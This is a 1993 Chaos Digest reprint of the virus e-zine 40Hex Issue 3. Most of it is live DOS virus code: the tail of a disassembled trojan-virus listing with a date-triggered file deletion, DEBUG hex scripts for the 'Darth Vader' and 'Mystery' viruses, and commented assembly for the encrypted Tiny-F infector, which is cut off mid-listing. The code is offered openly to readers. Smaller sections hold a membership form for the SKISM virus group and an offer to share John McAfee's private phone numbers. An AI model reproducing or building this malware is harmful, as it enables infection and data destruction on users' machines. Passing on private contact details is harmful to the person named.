                int     21h
                cmp     cx,ds:data_8e
                jb      loc_88
                cmp     dh,ds:data_9e
                jb      loc_88
                cmp     dl,ds:data_10e
                jb      loc_88
                mov     ah,30h
                int     21h
                cmp     al,3
                jae     loc_86
                mov     dx,0D0h
                call    sub_45
                clc
                jmp     short loc_88
                db      90h
loc_86:
                push    ds
                push    es
                xor     al,al
                mov     cx,8000h
                mov     es,word ptr cs:copyright+1
                mov     es,es:data_3e
                xor     di,di
loc_87:
                repne   scasb
                scasb
                jnz     loc_87
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                int     21h
                clc
                pop     es
                pop     ds
loc_88:
                cmc
                retn
sub_41          endp

sub_42          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_89:
                lodsb
                scasb
                stc
                jnz     loc_ret_90
                or      al,al
                jnz     loc_89

loc_ret_90:
                retn
sub_42          endp

sub_43          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_92

locloop_91:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_91

loc_92:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_43          endp

sub_44          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_93
                stc
loc_93:
                pop     di
                pop     si
                pop     cx
                retn
sub_44          endp

sub_45          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_94:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_95
                call    sub_46
                inc     bx
                jmp     short loc_94
loc_95:
                pop     dx
                pop     bx
                retn
sub_45          endp

sub_46          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_46          endp

sub_47          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_46
                mov     dl,0Ah
                call    sub_46
                pop     dx
                retn
sub_47          endp

                db      0, 0ACh, 29h, 0ADh, 29h, 0AEh
                db      29h, 0AFh, 29h, 0B0h, 29h, 0E9h
                db      6Ch, 2
loc_96:
                jmp     loc_97
                db      0
                db      13 dup (0)
                db      0E9h, 60h, 11h, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0D0h, 7, 6, 6
                db      13 dup (0)
                db      3, 2, 0CFh, 0C9h, 0Dh, 0CFh
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, 'Access denied'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
loc_97:
                push    ax
                push    bx
                mov     ax,word ptr ds:[101h]
                add     ax,103h
                shr     ax,1
                shr     ax,1
                shr     ax,1
                shr     ax,1
                mov     bx,ax
                mov     ax,cs
                add     ax,bx
                push    ax
                mov     ax,267h
                push    ax
                retf
                db      5Bh, 58h, 2Eh, 0C6h, 6, 1Ah
                db      0, 0FFh, 2Eh, 8Ch, 6, 17h
                db      1, 2Eh, 0A3h, 19h, 1, 2Eh
                db      89h, 26h, 1Bh, 1, 2Eh, 8Ch
                db      16h, 1Dh, 1, 8Ch, 0C8h, 8Eh
                db      0D0h, 0BCh, 4Bh, 2, 2Eh, 0A1h
                db      19h, 1, 50h, 53h, 51h, 52h
                db      56h, 57h, 55h, 1Eh, 6, 8Ch
                db      0C8h, 8Eh, 0D8h, 8Eh, 0C0h, 0A0h
                db      1Bh, 0, 3Ch, 50h, 75h, 6
                db      0E8h, 6Ch, 0, 0EBh, 15h, 90h
                db      3Ch, 44h, 75h, 6, 0E8h, 7Ah
                db      0, 0EBh, 0Bh, 90h
loc_98:
                cmp     al,4Ch
                jne     loc_99
                call    sub_49
                jmp     short loc_100
loc_99:
                stc
loc_100:
                jc      loc_103
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_101
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_102
loc_101:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_102:
                pop     ax
                mov     ss,word ptr cs:[11Dh]
                mov     sp,word ptr cs:[11Bh]
                jmp     dword ptr cs:data_4e
loc_103:
                mov     dx,104h
                call    sub_52
                mov     ax,4CFFh
                int     21h
                db      0BAh, 0AEh, 0, 0E8h, 0B6h, 0
                db      0C6h, 6, 58h, 0, 29h, 0BAh
                db      58h, 0, 0E8h, 79h, 0, 0E8h
                db      0C2h, 0, 0E8h, 8Ch, 0, 0C3h

sub_48          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_106
                cmp     dh,ds:data_9e
                jb      loc_106
                cmp     dl,ds:data_10e
                jb      loc_106
                mov     ah,30h
                int     21h
                cmp     al,3
                jae     loc_104
                mov     dx,0D0h
                call    sub_52
                clc
                jmp     short loc_106
                db      90h
loc_104:
                push    ds
                push    es
                xor     al,al
                mov     cx,8000h
                mov     es,word ptr cs:copyright+1
                mov     es,es:data_3e
                xor     di,di
loc_105:
                repne   scasb
                scasb
                jnz     loc_105
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                int     21h
                clc
                pop     es
                pop     ds
loc_106:
                cmc
                retn
sub_48          endp

sub_49          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_107:
                lodsb
                scasb
                stc
                jnz     loc_ret_108
                or      al,al
                jnz     loc_107

loc_ret_108:
                retn
sub_49          endp

sub_50          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_110

locloop_109:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_109

loc_110:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_50          endp

sub_51          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_111
                stc
loc_111:
                pop     di
                pop     si
                pop     cx
                retn
sub_51          endp

sub_52          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_112:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_113
                call    sub_53
                inc     bx
                jmp     short loc_112
loc_113:
                pop     dx
                pop     bx
                retn
sub_52          endp

sub_53          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_53          endp

sub_54          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_53
                mov     dl,0Ah
                call    sub_53
                pop     dx
                retn
sub_54          endp

                db      0F0h, 0FDh, 0C5h, 0AAh, 0FFh, 0F0h
                db      8Dh, 6Dh, 0B2h
                db      73h

seg_a           ends

                end     start

+++++

40Hex Issue 3                                                      0005

                  Application For Membership To SKISM


    SKISM is quickly becoming one of the largest virus creators/
    distributers in America.  Part of getting bigger is branching
    out in new directions and getting more members.

    If you wish to apply for membership to SKISM or if you want
    your board to become to become a SKISM distribution site
    fill out the application below and upload it to one of the
    SKISM home bases listed in file one of this archive.

    Keep in mind, from the start of the group SKISM we have been
    virus authors, not trojan, bomb, or any other such distructive
    mechanism.  The entire purpose of SKISM is virus reserch, to
    better understand the situation today with computer viruses.

    Therefore trojan and bomb authors shall apply elsewere, when
    you brush up your work, come back.  No disrespect intended.

-------------------------------------------------------------------------

                       Application For Membership


I am interested in becoming

___ A SKISM Member
___ A SKISM Distribution Site Sysop


Handle:      ________________
Aliases:     ________________
First Name:  ________________  (Used only for verification)


Have you ever written a computer virus(es)? ___
If yes name it/them: _______________________________________
                     _______________________________________

Programming Languages you know: ____________________________ Know Well
                                ____________________________    :
                                ____________________________    :
                                ____________________________ Hardly Know

Are you a sysop of a BBS?  ___
If yes leave the vitals:
                         BBS Name: _________________________
                         Dialup:   _________________________
                         State:    _________________________
                         Running:  example: Telegard._______

Are you in any way connected to and law enforcment agency? ___
Do you realize that being untruthfull to the above question
waviers all legal matters: ____
Are you in anyway connected to any software company? ___

List three people you know (handles) : _________________
                                       _________________
                                       _________________

List three BBS that you have elite access to:

Name: _____________________   Dialup: _______________________
Name: _____________________   Dialup: _______________________
Name: _____________________   Dialup: _______________________

Thank you.

Please upload this applcation to one of the SKISM distribution site
mentioned in the first file of this archive.

+++++

40Hex Issue 3                                                      0006

                               Virus News

10/91
-----

Well the virus world is going as good as ever, dispite the over 20
virus scanners/removers out there.

The October 28th issue of PC-Magazine did a huge artical on the newest
virus scanner/defense systems.  Mentioned in the artical were SKISM-1
and Captian Trips.

There is a new catagory of viruses out there, DIR-2 viruses.  Havent
located one as of yet, but hope to in the near future.

Bogus SCANS continue to surface in the public domain.  As if SCAN 82
was not played with enough, there have been many reports of bogus
versions SCAN 84.  Most of which contian trojan bombs and will distroy
the FAT table or boot sector of you hard disk upon execution.

I have the unreleased phone numbers of John Mcafee. Including his
private office, home, and fax numbers.  Get a hold of me somehow and I
will get them to you.

Theres a bogus version of the Red Cross virus going around on h/p
boards.  The first command is to terminate the program.  Things people
do for credit these days.

In case you haven't yet heard Patti Hoffmans VSUM, virus information
summary is now a giant hyper-text database.  It's really a good
program, check it out.  Can't wait to see a bogus version of that
going around.

That's it for no - till later.

+++++

40Hex Issue 3                                                      0007

                     The Darth Vader Virus Strain B

     The Darth Vader virus is pretty cool because it is a little
     differnt than most other viruses.  Instead of going resident
     and infecting all programs run, it infects the stack space
     of all .COM files, as they are copied.  Pretty cool, huh?

     This virus only infects .COM files with a stack space equal
     to its own size.

     It's orgin is Bulgeria, hmmm, has Bulgeria become the virus
     captial of the world all of a sudden???

     Well here it is, enjoy.

----------------------------------------------------------------------------
n darth-2.com
e 0100  E8 00 00 5E 83 EE 03 89 36 F0 00 A3 FE 00 31 C0
e 0110  8E D8 8E 06 AE 00 B8 00 90 8E D8 31 FF 47 81 FF
e 0120  00 0F 77 58 57 31 F6 B9 58 01 F3 A6 5F E3 02 EB
e 0130  EC 2E 8B 36 F0 00 2E 89 3E F2 00 0E 1F B9 58 01
e 0140  F3 A4 06 1F 8B F7 46 74 33 56 AD 93 AC 81 FB 36
e 0150  FF 74 03 5E EB F0 3C 16 75 F9 5E 56 2E 8B 3E F2
e 0160  00 89 3E 04 00 81 C7 41 01 A5 A5 A4 5F B0 9A AA
e 0170  B8 95 00 2E 03 06 F2 00 AB 8C C0 AB 0E 0E 1F 07
e 0180  BF 00 01 57 8B 36 F0 00 81 C6 47 01 A5 A4 A1 FE
e 0190  00 C3 E9 9C 00 2E 8C 1E 0A 00 2E 89 16 0C 00 2E
e 01A0  89 0E 0E 00 50 53 51 06 56 57 80 FC 40 75 E3 81
e 01B0  F9 68 01 72 DD B8 20 12 CD 2F 26 8A 1D B8 16 12
e 01C0  CD 2F 83 C7 28 0E 1F BE 4A 01 03 36 04 00 B9 03
e 01D0  00 F3 A6 75 5C 1E 07 2E 8E 1E 0A 00 2E 8B 36 0C
e 01E0  00 BF 47 01 2E 03 3E 04 00 A5 A4 B8 00 90 8E C0
e 01F0  2E 8B 0E 0E 00 31 FF 46 49 74 36 51 56 B9 58 01
e 0200  F3 A6 5E E3 03 59 EB ED 59 56 1E 2E 8E 06 0A 00
e 0210  2E 8B 3E 0C 00 B0 E9 AA 2E 2B 36 0C 00 83 EE 03
e 0220  8B C6 AB 07 5F 0E 1F 2E 8B 36 04 00 B9 58 01 F3
e 0230  A4 5F 5E 07 59 5B 58 2E 8B 16 0C 00 2E 8E 1E 0A
e 0240  00 00 00 00 00 00 CB CD 20 90 43 4F 4D 44 61 72
e 0250  74 68 20 56 61 64 65 72 90 1A 1A 1A 1A 1A 1A 1A
rcx
159
w
q

+++++

40Hex Issue 3                                                        0008

                             Mystery Virus


        Actually I do know what this virus is, but being Halloween time
        and all I thought I'd let you find out for yourself.

-------------------------------------------------------------------------
n mystery.com
e 0100  E9 4B 00 CD 21 2E 56 53 2E 00 8C C3 83 C3 10 2E
e 0110  03 9C 3C 07 2E 89 9C 32 00 2E 8B 9C 3A 07 2E 89
e 0120  9C 30 00 8C C3 83 C3 10 2E 03 9C 40 07 8E D3 2E
e 0130  8B A4 3E 07 EA 00 00 00 00 BF 00 01 81 C6 42 07
e 0140  A4 A5 8B 26 06 00 33 DB 53 FF 64 F5 00 07 E8 00
e 0150  00 5E 83 EE 4C FC 2E 81 BC 42 07 4D 5A 74 0E FA
e 0160  8B E6 81 C4 FC 08 FB 3B 26 06 00 73 CC 2E C6 84
e 0170  76 00 C5 50 06 56 1E 0E 1F B8 00 C5 CD 21 3D 31
e 0180  67 75 04 07 E9 AB 00 07 B4 49 CD 21 BB FF FF B4
e 0190  48 CD 21 81 EB E8 00 73 03 E9 96 00 8C C1 F9 13
e 01A0  CB B4 4A CD 21 BB E7 00 F9 26 19 1E 02 00 06 8E
e 01B0  C1 B4 4A CD 21 8C C0 48 8E D8 C7 06 01 00 08 00
e 01C0  E8 E1 05 8B D8 8B CA 1F 8C D8 E8 D7 05 03 06 06
e 01D0  00 83 D2 00 2B C3 1B D1 72 04 29 06 06 00 1E 0E
e 01E0  2E C6 84 F5 00 62 33 FF 8E DF 1F B9 95 07 90 F3
e 01F0  A4 26 C7 06 49 07 00 00 B8 00 62 CD 21 8E DB 8B
e 0200  3E 08 00 8B DF 8B 3E 06 00 47 8E DB 8B 5D 02 8B
e 0210  3D 83 C7 1A 26 89 1E 93 07 8C C1 8E C3 FA B8 EA
e 0220  00 AA B8 38 03 AB 8B C1 AB 8E C1 26 89 3E 91 07
e 0230  FB 07 B8 00 2A CD 21 3A D6 74 14 E9 8D 00 69 62
e 0240  6D 40 40 53 4E 53 20 20 20 20 20 20 20 20 20 0E
e 0250  1F 5E 56 2E C6 84 68 01 CD B0 02 B9 01 00 33 D2
e 0260  2E C6 84 69 01 25 8B DE 81 C3 26 03 56 2D 4C 5A
e 0270  5E 72 58 06 1E 07 2E C6 84 B1 01 26 2E C6 84 B0
e 0280  01 CD 8B FB 81 C7 F3 01 56 8B F3 83 C6 0B B9 09
e 0290  00 83 3C 00 74 16 F3 A4 5E 8B FB 83 C7 03 56 81
e 02A0  C6 39 01 B9 11 00 AC 2C 20 AA E2 FA 5E 56 33 D2
e 02B0  B0 02 B9 01 00 0C 1B 58 5E 07 72 0F 0E 1F 58 1F
e 02C0  B8 03 C5 CD 21 58 B8 00 4C CD 21 5E 07 58 06 1F
e 02D0  2E 81 BC 42 07 4D 5A 75 03 E9 2E FE E9 5A FE 50
e 02E0  53 51 52 56 57 06 1E 0E 1F 80 3E 39 07 01 75 2A
e 02F0  B8 03 00 CD 10 C6 06 35 07 09 C6 06 38 07 00 C6
e 0300  06 36 07 00 C6 06 37 07 00 C6 06 33 07 00 C6 06
e 0310  39 07 00 90 C7 06 31 07 D2 06 80 3E 33 07 01 75
e 0320  03 E9 D5 00 80 3E 30 07 00 74 07 FE 0E 30 07 E9
e 0330  C7 00 8B 1E 31 07 83 3F FF 75 13 E4 61 24 FC E6
e 0340  61 C6 06 34 07 00 C6 06 33 07 01 E9 AB 00 80 3E
e 0350  34 07 01 75 03 E9 92 00 B0 B6 E6 43 8A 47 02 A2
e 0360  30 07 C6 06 34 07 01 8B 1F B8 DD 34 BA 12 00 F7
e 0370  F3 E6 42 8A C4 E6 42 E4 61 0C 03 E6 61 83 06 31
e 0380  07 03 8A 36 37 07 8D 36 A5 06 B9 03 00 80 3E 35
e 0390  07 0F 7E 09 C6 06 35 07 09 90 EB 0E 90 80 3E 35
e 03A0  07 09 73 06 C6 06 35 07 0F 90 8A 1E 35 07 8A 16
e 03B0  36 07 E8 4D 00 FE C6 E2 F1 80 06 36 07 02 80 3E
e 03C0  38 07 01 74 19 80 3E 37 07 15 77 0C 80 06 37 07
e 03D0  02 FE 06 35 07 EB 22 90 C6 06 38 07 01 90 80 2E
e 03E0  37 07 02 FE 0E 35 07 EB 10 90 8A 07 A2 30 07 C6
e 03F0  06 34 07 00 83 06 31 07 01 1F 07 5F 5E 5A 59 5B
e 0400  58 CF 51 B7 00 B4 02 CD 10 B9 01 00 AC 0A C0 74
e 0410  18 2C 20 3C DF 74 04 3C DC 75 06 B9 22 00 80 C2
e 0420  21 B4 09 CD 10 FE C2 EB DC 59 C3 B0 03 CF E8 39
e 0430  01 E8 49 03 9D 80 FC 68 2E FF 2E 91 07 55 8B EC
e 0440  FF 76 06 9D 5D 9C FC 3D 00 4B 74 E2 80 FC 3C 74
e 0450  0A 80 FC 3E 74 4A 80 FC 5B 75 6F 2E 83 3E 49 07
e 0460  00 74 03 E9 A6 00 E8 B9 00 74 03 E9 9E 00 E8 0C
e 0470  03 9D E8 EB 00 73 03 E9 99 00 9C 06 0E 07 56 57
e 0480  51 50 BF 49 07 AB 8B F2 B9 41 00 AC AA 84 C0 74
e 0490  07 E2 F8 26 89 0E 49 07 58 59 5F 5E 07 9D 73 73
e 04A0  2E 3B 1E 49 07 75 65 85 DB 74 61 E8 CF 02 9D E8
e 04B0  AE 00 72 5F 9C 1E 0E 1F 52 BA 4B 07 E8 AB 00 2E
e 04C0  C7 06 49 07 00 00 5A 1F EB D3 80 FC 3D 74 35 80
e 04D0  FC 43 74 30 80 FC 56 74 2B 80 FC C5 75 2E 3C 03
e 04E0  74 06 B8 31 67 EB 37 90 1E B8 00 00 8E D8 FA C7
e 04F0  06 70 00 DA 01 8C 0E 72 00 FB 1F 2E C6 06 39 07
e 0500  01 EB 1B 90 E8 1B 00 75 03 E8 5E 00 E8 6E 02 9D
e 0510  E8 4D 00 9C 1E E8 70 02 C6 06 00 00 5A 1F 9D CA
e 0520  02 00 50 56 8B F2 AC 84 C0 74 24 3C 2E 75 F7 E8

------------------------------

End of Chaos Digest #1.39
************************************

Chaos Digest              Vendredi 28 Mai 1993        Volume 1 : Numero 40
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.40 (28 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #008(2)-010 (reprint)
File 2--Agence de Protection des Donnees Espagnoles (creation)
File 3--"BootX" pour Amiga (critique)
File 4--Nouveau rebondissement de _The Legion of Doom_ (news)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #008(2)-010 (reprint)

[suite du listing du "Mystery Virus":]


e 0530  22 00 8A E0 E8 1D 00 3D 6F 63 74 0C 3D 78 65 75
e 0540  10 E8 10 00 3C 65 EB 09 E8 09 00 3C 6D EB 02 FE
e 0550  C0 5E 58 C3 AC 3C 43 72 06 3C 59 73 02 04 20 C3
e 0560  9C 80 FC 68 2E FF 1E 91 07 C3 1E 06 56 57 50 53
e 0570  51 52 8C DE 33 C0 8E D8 C4 06 90 00 06 50 C7 06
e 0580  90 00 26 03 8C 0E 92 00 8E DE 33 C9 B8 00 43 E8
e 0590  CE FF 8B D9 80 E1 FE 3A CB 74 07 B8 01 43 E8 BF
e 05A0  FF F9 9C 1E 52 53 B8 02 3D E8 B4 FF 72 0A 8B D8
e 05B0  E8 26 00 B4 3E E8 A8 FF 59 5A 1F 9D 73 06 B8 01
e 05C0  43 E8 9C FF 33 C0 8E D8 8F 06 90 00 8F 06 92 00
e 05D0  5A 59 5B 58 5F 5E 07 1F C3 0E 1F 0E 07 BA 95 07
e 05E0  B9 18 00 B4 3F E8 78 FF 33 C9 33 D2 B8 02 42 E8
e 05F0  6E FF 89 16 AF 07 3D 00 0B 83 DA 00 72 6C A3 AD
e 0600  07 81 3E 95 07 4D 5A 75 17 A1 9D 07 03 06 AB 07
e 0610  E8 91 01 03 06 A9 07 83 D2 00 8B CA 8B D0 EB 15
e 0620  80 3E 95 07 E9 75 44 8B 16 96 07 81 C2 03 01 72
e 0630  3A FE CE 33 C9 B8 00 42 E8 25 FF 05 00 07 90 83
e 0640  D2 00 3B 06 AD 07 75 23 3B 16 AF 07 75 1D BA B1
e 0650  07 8B F2 B9 EF 02 B4 3F E8 05 FF 72 0E 3B C8 75
e 0660  0A BF 49 00 AC AE 75 03 E2 FA C3 33 C9 33 D2 B8
e 0670  02 42 E8 EB FE A3 45 07 89 16 47 07 81 3E 95 07
e 0680  4D 5A 74 0A 05 95 09 90 83 D2 00 74 19 C3 8B 16
e 0690  AD 07 F6 DA 83 E2 0F 33 C9 B8 01 42 E8 C1 FE A3
e 06A0  AD 07 89 16 AF 07 B8 00 57 E8 B4 FE 9C 51 52 81
e 06B0  3E 95 07 4D 5A 74 05 B8 00 01 EB 07 A1 A9 07 8B
e 06C0  16 AB 07 2E C7 06 47 00 00 07 BF 3A 07 AB 8B C2
e 06D0  AB A1 A5 07 AB A1 A3 07 AB BE 95 07 A4 A5 33 D2
e 06E0  B9 49 07 90 B4 40 E8 77 FE 72 27 33 C8 75 23 8B
e 06F0  D1 B8 00 42 E8 69 FE 81 3E 95 07 4D 5A 74 15 C6
e 0700  06 95 07 E9 A1 AD 07 05 46 00 A3 96 07 B9 03 00
e 0710  EB 57 EB 5D E8 8A 00 F7 D0 F7 D2 40 75 01 42 03
e 0720  06 AD 07 13 16 AF 07 B9 10 00 F7 F1 C7 06 A9 07
e 0730  49 00 A3 AB 07 05 72 00 A3 A3 07 C7 06 A5 07 00
e 0740  01 81 06 AD 07 49 07 83 16 AF 07 00 A1 AD 07 25
e 0750  FF 01 A3 97 07 9C A1 AE 07 D0 2E B0 07 D1 D8 9D
e 0760  74 01 40 A3 99 07 B9 18 00 BA 95 07 B4 40 E8 EF
e 0770  FD 5A 59 9D 72 06 B8 01 57 E8 E4 FD C3 1E E8 07
e 0780  00 C6 06 00 00 4D 1F C3 50 53 B4 62 E8 D1 FD 8C
e 0790  C8 48 4B 8E DB F9 13 1E 03 00 3B D8 72 F5 5B 58
e 07A0  C3 A1 9D 07 BA 10 00 F7 E2 C3 FE FF FD 00 FE 40
e 07B0  75 73 73 72 40 40 40 40 40 76 89 92 95 73 8F 86
e 07C0  94 40 40 48 83 49 40 40 96 51 4E 40 51 59 59 50
e 07D0  40 FD 00 FE FC FD 00 4A 01 03 01 B8 01 0B 01 4A
e 07E0  01 06 01 72 01 01 02 9F 01 09 01 15 01 02 02 15
e 07F0  01 03 02 72 01 08 01 4A 01 05 02 26 01 01 01 4A
e 0800  01 08 02 15 01 03 02 15 01 03 03 26 01 08 02 26
e 0810  01 05 01 4A 01 01 02 72 01 08 01 72 01 04 01 72
e 0820  01 04 00 72 01 08 02 9F 01 06 02 B8 01 01 02 EE
e 0830  01 0F FF FF FF 00 00 00 01 00 00 00 00 00 00 00
e 0840  01 3A 16 D8 8E C3 8E B8 00 4C 05 00 00 00 1A 1A

rcx
74e
w
q

+++++

 40Hex Issue 3                                                      0009

                            The Tiny-F Virus

       In our first issue we gave you the source for the Tiny-B virus.
       Well some people don't quit.

       After months of struggling Psyco-genius decided to give
       his attempts to make this a good virus over to someone who
       knows what he's doning.

       So Dark (mastered assembler in one week) Angel did some mods
       and here we have it.

-------------------------------------------------------------------------
tinyv   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:tinyv, DS:tinyv, SS:tinyv, ES:tinyv

        ORG     100h

DOS     EQU     21h

start:  JMP     pgstart
exlbl:  db      0CDh, 20h, 7, 8, 9
pgstart:CALL    tinyvir
tinyvir:
        POP     SI                      ; get SI for storage
        SUB     SI,offset tinyvir       ; reset SI to virus start
        MOV     BP,[SI+blnkdat]         ; store SI in BP for return
        ADD     BP, OFFSET exlbl
        CALL    endecrpt
        JMP     SHORT realprog

;------------------------------------------------------------------------
;nonencrypted subroutines start here
;------------------------------------------------------------------------

;PCM's encryption was stupid, mine is better - Dark Angel
endecrpt:
;Only need to save necessary registers - Dark Angel
        PUSH    AX                      ; store registers
        PUSH    BX
        PUSH    CX
        PUSH    SI
;New, better, more compact encryption engine
        MOV     BX, [SI+EN_VAL]
        ADD     SI, offset realprog
        MOV     CX, endenc - realprog
        SHR     CX, 1
        JNC     start_encryption
        DEC     SI
start_encryption:
        MOV     DI, SI
encloop:
        LODSW                           ;DS:[SI] -> AX
        XOR     AX, BX
        STOSW
        LOOP    encloop

        POP     SI                      ;restore registers
        POP     CX
        POP     BX
        POP     AX
        RET
;-----end of encryption routine
nfect:
        CALL    endecrpt
        MOV     [SI+offset endprog+3],AX;point to data
        MOV     AH,40H                  ;write instruction
        LEA     DX,[SI+0105H]           ;write buffer loc    |
        MOV     CX,offset endprog-105h  ;(size of virus)  --\|/--
        INT     DOS                     ;do it!
        PUSHF
        CALL    endecrpt
        POPF
        JC      outa1                    ;error, bug out
        RET
outa1:
        JMP     exit


;------------------------------------------------------------------------
;    Unencrypted routines end here
;------------------------------------------------------------------------
realprog:
        CLD                             ;forward direction for string ops
;Why save DTA?  This part killed.  Saves quite a few bytes.  Dark Angel
;Instead, set DTA to SI+ENDPROG+131h
        MOV     AH, 1Ah                 ;Set DTA
        LEA     DX, [SI+ENDPROG+131h]   ; to DS:DX
        INT     21h

        LEA     DX,[SI+fspec]           ;get filespec (*.COM)
        XOR     CX, CX                  ;       ||   (clear regs)
        MOV     AH,4EH                  ;       ||   (find files)
mainloop:                               ;      \||/
        INT     DOS                     ;   ----\/----
        JC      hiccup                  ;no more files found, terminate virus
;Next part had to be changed to account for new DTA address - Dark Angel
        LEA     DX, [SI+ENDPROG+131h+30];set file name pointer
                                        ;(offset 30 is DTA filename start)
        MOV     AX,3D02H                ;open file
        INT     DOS                     ;do it!
        MOV     BX,AX                   ;move file handle to BX
        MOV     AH,3FH                  ;read file
        LEA     DX,[SI+endprog]         ;load end of program (as buffer pntr)
        MOV     DI,DX                   ;set Dest Index to area for buffer
        MOV     CX,0003H                ;read 3 bytes
        INT     DOS                     ;do it!
        CMP     BYTE PTR [DI],0E9H      ;check for JMP at start
        JE      infect                  ;If begins w/JMP, Infect
nextfile:
        MOV     AH,4FH                  ;set int 21 to find next file
        JMP     mainloop                ;next file, do it!
hiccup: JMP     exit
infect:
        MOV     AX,5700h                ;get date function
        INT     DOS                     ;do it!
        PUSH    DX                      ;store date + time
        PUSH    CX
        MOV     DX,[DI+01H]             ;set # of bytes to move
        MOV     [SI+blnkdat],DX         ; "  " "    "   "   "
;Tighter Code here - Dark Angel
        XOR     CX,CX                   ; "  " "    "   "   " (0 here)
        MOV     AX,4200H                ;move file
        INT     DOS                     ;do it!
        MOV     DX,DI                   ;set dest index to area for buffer
        MOV     CX,0002H                ;two bytes
        MOV     AH,3FH                  ;read file
        INT     DOS                     ;do it!
        CMP     WORD PTR [DI],0807H     ;check for infection
        JE      nextfile                ;next file if infected
getaval:                                ;encryption routine starts here
;My modifications here - Dark Angel
        MOV     AH, 2Ch                 ;DOS get TIME function
        INT     DOS                     ;do it!
        OR      DX, DX                  ;Is it 0?
        JE      getaval                 ;yeah, try again
        MOV     word ptr [si+offset en_va], DX ; Store it
;Tighter code here - Dark Angel
        XOR     DX,DX                   ;clear regs
        XOR     CX,CX                   ;  "    "
        MOV     AX,4202H                ;move file pointer
        INT     DOS                     ;do it!
        OR      DX,DX                   ;new pointer location 0?
        JNE     nextfile                ;if no then next file
        CMP     AH,0FEH                 ;new pointer loc too high?
        JNC     nextfile                ;yes, try again
        CALL    nfect
        MOV     AX,4200H                ;move pointer
        XOR     CX, CX                  ;clear reg
